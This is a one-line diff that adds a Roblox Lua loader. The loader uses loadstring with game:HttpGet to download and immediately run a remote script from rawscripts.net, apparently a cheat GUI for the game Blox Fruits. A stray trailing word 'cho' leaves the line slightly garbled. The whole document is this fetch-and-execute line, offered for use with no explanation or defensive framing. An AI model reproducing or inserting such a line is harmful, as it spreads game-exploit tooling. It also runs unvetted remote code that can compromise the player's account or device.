@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/RED-EVENT-Blox-Fruits-Blox-Fruit-OP-script-free-gui-Xenith-51769"))() cho 
